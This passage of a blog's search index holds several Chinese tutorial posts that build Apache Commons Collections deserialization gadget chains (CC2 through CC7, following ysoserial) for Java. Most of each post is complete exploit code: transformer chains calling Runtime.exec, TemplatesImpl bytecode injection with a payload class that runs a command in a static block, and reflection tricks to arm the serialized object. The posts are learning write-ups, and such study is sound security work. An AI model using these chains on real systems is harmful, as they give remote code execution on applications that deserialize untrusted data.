c.getDeclaredField(&quot;iTransformers&quot;);iTransformersField.setAccessible(true);iTransformersField.set(chainedTransformer, transformers);lazyMap2.remove(&quot;yy&quot;);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC7.txt&quot;));oos.writeObject(hashtable);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC7.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"JAVA安全:CC5链","slug":"JAVA安全CC5链","date":"2024-03-19T13:38:03.242Z","updated":"2024-03-25T12:30:56.368Z","comments":true,"path":"2024/03/19/JAVA安全CC5链/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC5%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis 前言CC5的限制比较多，对于jdk版本以及必须WITHOUT a security manager 实际上这个CC5链和CC1很像啊，只是改变了LazyMap的get方法的触发方式，为了记录学习过程，还是写下来吧。 正文先看一下ysoserial的CC5流程： 由于和CC1链很像，我们就先把CC1复制过来看看： 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); 我们需要改的就是LazyMap的后边，先看看调用get方法的类吧 1.TiedMapEntry部分 可见TiedMapEntry的getValue方法调用了get方法，可作为一个点，我们继续往上找： 可见其toString方法调用了getValue方法，我们再往上找 2.BadAttributeValueExpException部分 可见BadAttributeValueExpException的readObject方法调用了toString方法，我们接下来只需要让valObj是我们传入的TiedMapEntry实例就行了，我们来看看valObj怎么来的： 12ObjectInputStream.GetField gf = ois.readFields();Object valObj = gf.get(&quot;val&quot;, null); 说白了，valObj的值就是从输入流ois中读取的对象的”val”字段的值。如果该字段不存在或者值为null，valObj的值就会是null。 那么怎么控制val呢？如果直接在构造器中调用的话，那么在构造的时候就会直接触发这条链子，很简单，用反射不就是了 12345BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);Class c = badAttributeValueExpException.getClass();Field valField = c.getDeclaredField(&quot;val&quot;);valField.setAccessible(true);valField.set(badAttributeValueExpException, tiedMapEntry); 3.构造链把上边的直接改到CC1链子里就行了： 1234567891011121314151617181920212223Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);Class c = badAttributeValueExpException.getClass();Field valField = c.getDeclaredField(&quot;val&quot;);valField.setAccessible(true);valField.set(badAttributeValueExpException, tiedMapEntry);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));oos.writeObject(badAttributeValueExpException);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC1.txt&quot;));ois.readObject(); CC5就完成了。","categories":[],"tags":[]},{"title":"JAVA安全:CC2链","slug":"JAVA安全CC2链","date":"2024-03-19T09:53:13.362Z","updated":"2024-06-17T09:01:45.460Z","comments":true,"path":"2024/03/19/JAVA安全CC2链/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC2%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis 前言CC2这条链和CC4很像，只是改变了原先的ChainedTransformer的地方。CC2作为CC链中唯一不用数组的链子，其作用听白日梦组长说是为了防止某些中间件重写类加载的流程，导致数组可能会加载不到。同时，CC1链在jdk8u71以上的版本因为AnnotationInvocationHandler类的readObject方法被修复了 正文emmm… 我们还是先看一下ysoserial中的CC2流程： 基本上是和CC4是一样的，我们只需要更改ChainedTransformer就好了： 1.InvokerTransformer部分先把CC4贴出来： 123456789101112131415161718192021222324252627282930313233TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, chainedTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); 将CC4中的： 1234Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;; 改成： 1InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;); 相当于绕过了TrAXFilter和InstantiateTransformer，将其替换成了InvokerTransformer，进一步地沟通了TransformingComparator和 TemplatesImpl 2.传入templates目前我们的链子是这样的： 12345678910111213141516171819202122232425262728TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, invokerTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); 因为ChainedTransformer被替换掉了，其中的ConstantTransformer自然也是没了，我们就需要传参了，先运行一下看看哪里报错，我们进去调试查看需要传参的地方即可： 报错整数类型的对象没有newTransformer方法，再看看我们的链子，是不是突然明白该改哪里了呢？ 我们将add的内容改为templates即可： 12345678910111213141516171819202122232425262728TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(templates);priorityQueue.add(templates);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, invokerTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject(); CC2就这样完成了","categories":[],"tags":[]},{"title":"JAVA安全:CC4链","slug":"JAVA安全CC4链","date":"2024-03-19T03:43:21.919Z","updated":"2024-03-19T09:52:30.841Z","comments":true,"path":"2024/03/19/JAVA安全CC4链/","link":"","permalink":"http://example.com/2024/03/19/JAVA%E5%AE%89%E5%85%A8CC4%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;19 分类：Vulnerability Analysis 前言经过前几条链子的学习积累，CC4的学习可以说是轻松了很多。CC4这条链子和前边的不同之处在于commons-collections由原先的大版本3改成了大版本4，也就是说作用范围不同。 本质上来看，CC4和之前CC3的区别在于更改了前边的触发方式，由AnnotationInvocationHandler的readObject-&gt;Proxy-&gt;AnnotationInvocationHandler的invoke-&gt;LazyMap的get+一系列transform变为了PriorityQueue的readObject-&gt;PriorityQueue的heapify-&gt;PriorityQueue的siftDown-&gt;PriorityQueue的siftDownUsingComparator-&gt;TransformingComparator的compare+一系列transform。实际上还是换汤不换药，我们直接进入正文。 正文先来看一下ysoserial中的链子构造： 知道了大致思路，我们就自己来从头写一遍。 1.TransformingComparator部分思路先捋一捋，我们在commons-collections4中，原先的CC3链子在ChainedTransformer之后就断掉了，因此我们要找一个能够触发transform方法的类作为LazyMap的替代，于是便找到了TransformingComparator： 可见TransformingComparator的compare方法调用了transform方法，我们接下来只需要确保构造时传入构造好的chainedTransformer就好了，至于compare的参数并不是有用的，因为我们的ConstantTransformer太强了。 之后便是寻找调用compare方法的类，这里CC4作者直接用了内部类。 2.PriorityQueue部分 可见PriorityQueue的siftDownUsingComparator调用了compare方法，我们再往上找，找到了PriorityQueue的siftDown方法： 接着往上找，找到PriorityQueue的heapify方法： 再往上找，就找到了PriorityQueue的readObject方法了： 实际上，这样子就基本上大功告成了，我们来构造链子。 3.构造链3.1 拼接至于CC3的后半部分，我就全拿过来了： 12345678910111213141516171819TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); CC3_test.class还是一样的。 剩下的先用TransformingComparator接住chainedTransformer： 1TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer); 再用PriorityQueue接住transformingComparator： 1PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator); 嗯，最后序列化和反序列化就应该好了： 123456789101112131415161718192021222324252627TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(chainedTransformer);PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); 3.2 问题结果无事发生，肯定是中间某一部分出错了，我们就在PriorityQueue的readObject打个断点调试一下看看问题所在： 可以看到这个size为0，传入之后不会通过for循环触发接下来的方法，那我们就需要给这个数组加点元素，让它右移一位仍旧大于0，很简单，直接传两个数，让它size为2就行了： 12priorityQueue.add(1);priorityQueue.add(2); 结果发现在序列化之前就已经弹出计算器了，说明前边的代码有调用整条链子的方法。实际上这里是add方法，我们进去看一下： 可见这一套流程下来也会触发compare方法，我们不想让它本地执行也很简单，直接在给transformingComparator赋值的时候随便给一个值，之后在序列化之前给它改回chainedTransformer就好了。 3.3 完工最终完整链子如下： 123456789101112131415161718192021222324252627282930313233TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);priorityQueue.add(1);priorityQueue.add(2);Class c = transformingComparator.getClass();Field transformerField = c.getDeclaredField(&quot;transformer&quot;);transformerField.setAccessible(true);transformerField.set(transformingComparator, chainedTransformer);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));oos.writeObject(priorityQueue);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC4.txt&quot;));ois.readObject();","categories":[],"tags":[]},{"title":"JAVA安全:CC3链","slug":"JAVA安全CC3链","date":"2024-03-18T06:49:00.261Z","updated":"2024-03-19T02:55:01.427Z","comments":true,"path":"2024/03/18/JAVA安全CC3链/","link":"","permalink":"http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;18 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;18 分类：Vulnerability Analysis 前言CC3这条链子和之前的几条链子不太一样，它更改了命令执行的方式。之前的几条链子都是反射调用Runtime.getRuntime.exec(“calc”)执行的命令，而CC3则是利用的动态类加载。简单来说，就是Java文件无法直接运行，需要编译成.class文件，再通过加载器加载到Java虚拟机的内存空间中才能运行。其核心便是ClassLoader类，其中的loadClass–&gt;findClass–&gt;defineClass三个方法的调用是必须的，最重要的是defineClass方法。 说了那么多，不如直接写一个例子看一看： 其中，CC3_test中则是： emmm……. 了解了这些之后，应该就差不多能理解整条CC3链子了，我们直接进入正文。 正文和往常一样，我们先看一下ysoserial中链子的调用流程： 可见其中对CC1的后半部分保留完整，大致是在LazyMap.get方法的触发之前的流程给改了，我们就一点点看吧。 1.TemplatesImpl部分首先我们要找重写了defineClass方法且可序列化的类，且参数可控，往上便找到了TemplatesImpl: 然后就按正常流程，一点点往上找就完了。 于是便找到了调用defineClass方法的地方： 关键代码就这么多，反正就是defineTransletClasses方法中的for循环里调用了，且_bytecodes可控。 再向上找： 找到了getTransletInstance方法，再向上找便找到了newTransformer： 看到这里，就基本上完成了，我们只需要注意一下传参，链子的大致形状就差不多确定了。 传参部分呢，我们从前往后看，正常来说看到的便只需赋值_name参数，让它不要返回null，并且_class参数不能传，因为我们要的就是defineTransletClasses方法，最关键的_bytecode必须传，因为我们要用它来作为执行代码的载体。这样编译好了之后会发现报错，调进去一看可看到问题出在调用_factory参数的地方，那么这个参数我们也要传。先看一下代码中它本身应该是什么： 是TransformerFactoryImpl类的实例，那我们就传这个。 那么这部分的链子就构造的差不多了： 1234567891011121314TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());templates.newTransformer(); 对了，这里还有一点要提醒，编译执行代码的class文件的java文件需要继承AbstractTranslet这个类，不然就会报空指针错误，继承之后还让实现一下接口，我们实现了就好了。 java文件内容差不多是这样： 12345678910111213141516171819public class CC3_test extends AbstractTranslet &#123; static &#123; try&#123; Runtime.getRuntime().exec(&quot;calc&quot;); &#125;catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 剩下的话，除了要注意一下要把ChainedTransformer的内容改一下，使其触发templates的newTransformer方法就好了。我们就直接把CC1链子的前半部分拿过来： 1234567891011121314151617181920212223242526272829303132333435TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;,null,null),&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); 看起来不错，但和ysoserial中的链子还是有差别，我们需要对其进行更改，把InvokerTransformer给用其他调用newTransformer的类替代掉，因为有的jdk版本中对InvokerTransformer做了过滤。ysoserial中用的是TrAXFilter和InstantiateTransformer。我们一个个看，先看TrAXFilter，再看InstantiateTransformer。 2.ChainedTransformer部分2.1 TrAXFilter部分 可见其构造器，我们直接传入templates对象便可调用其newTransformer方法，只是可惜TrAXFilter没有实现Serializable接口，只能用TrAXFilter配合反射来解决这个问题，于是便有了InstantiateTransformer。 2.2 InstantiateTransformer部分 关键代码就这些，我们只需要把TrAXFilter.class作为input参数传进去就好了，至于paramTypes我们可以传一个new Class[]{Templates.class}，而参数就直接传构造好的templates，把链子构造起来就是如下模样： 12345Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers); 3.构造链我们直接把ChainedTransformer部分的修改给添上去就好了： 1234567891011121314151617181920212223242526272829303132333435TemplatesImpl templates = new TemplatesImpl();Class tc = templates.getClass();Field nameField = tc.getDeclaredField(&quot;_name&quot;);nameField.setAccessible(true);nameField.set(templates,&quot;aaaa&quot;);Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);bytecodesField.setAccessible(true);byte[] code = Files.readAllBytes(Paths.get(&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;));byte[][] codes = &#123;code&#125;;bytecodesField.set(templates,codes);Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);tfactoryField.setAccessible(true);tfactoryField.set(templates, new TransformerFactoryImpl());// templates.newTransformer();Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);//反射获取AnnotationInvocationHandler类Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);constructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,handler);handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);//序列化ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));oos.writeObject(handler);//反序列化ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;C:\\\\Users\\\\Narcher\\\\IdeaProjects\\\\CC3.txt&quot;));ois.readObject(); 这样一来，CC3也便大功告成了。","categories":[],"tags":[]},{"title":"JAVA安全:CC6链","slug":"JAVA安全CC6链","date":"2024-03-17T11:28:41.733Z","updated":"2024-08-24T03:24:40.522Z","comments":true,"path":"2024/03/17/JAVA安全CC6链/","link":"","permalink":"http://example.com/2024/03/17/JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/","excerpt":"作者：Narcher 时间：2024&#x2F;3&#x2F;17 分类：Vulnerability Analysis","text":"作者：Narcher 时间：2024&#x2F;3&#x2F;17 分类：Vulnerability Analysis 前言CC6这条链不受jdk版本限制，可谓非常好用。当初我接触到的第一个Java反序列化的题就是用CC6解决的，印象十分深刻。 之前我们学习了URLDNS这条链，实际上就是为了CC6做准备，因为二者有一些异曲同工之妙。 正文我们先和往常一样，去看一下ysoserial中的CC6的流程： 可以发现这条链的后半部分和我们的CC1这条链的后半部分一模一样，前边则是由AnnotationInvocationHandler的invoke方法触发get方法修改成了TiedMapEntry类中的方法来触发。我们来调试一下看看。 1.TiedMapEntry部分首先，前边一模一样，我就直接copy过来了，直接从TiedMapEntry的getValue()方法来看。 实际上它的getValue中调用了map的get方法，而map是可控的，因此我们可以直接传入构造好的LazyMap，之后我们再看一下key，其实这个key我们是完全不用管的，因为CC1的时候已经讲过，ConstantTransformer无视了调用时的传参。 之后我们再看一下谁调用了getValue方法： 实际上，还是这个类里边的hashCode方法。 2.HashMap部分看见hashCode方法，我们又刚学完URLDNS这条链，实际上就很明白了，直接上HashMap梭哈（既能调用hashCode方法，又直接重写了readObject方法，简直完美）： HashMap的readObject方法中有这么一句，调用了hash方法，而hash方法内则又调用了hashCode: 这样我们就只需要注意将key传参为我们想要利用的TiedMapEntry就好了。 3.构造链我们把上边所说的按流程串起来： 12345678910111213141516171819Transformer[] transformers=new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();map.put(&quot;value&quot;,&quot;value&quot;);LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(innerMap, &quot;aaa&quot;);HashMap&lt;Object, Object&gt; hashMap = new 